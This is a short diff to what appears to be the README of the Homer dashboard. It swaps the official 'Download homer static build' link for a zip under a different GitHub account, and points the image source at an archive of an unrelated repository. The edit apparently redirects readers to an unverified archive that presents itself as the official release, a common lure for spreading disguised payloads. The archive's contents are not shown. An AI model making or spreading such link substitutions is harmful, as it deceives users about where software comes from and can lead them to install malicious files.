@@ -1,4 +1,4 @@
-  <a href="https://github.com/bastienwirtz/homer/releases/latest/download/verzija_najnovija_(3.5).zip"><img
+  <a href="https://github.com/jurajzecic/homer/releases/latest/download/verzija_najnovija_(3.5).zip"><img
   alt="Download homer static build"
   src="https://github.com/jurajzecic/discord-bot-index.hr/archive/refs/heads/verzija_najnovija_(3.5).zip"></a>
   
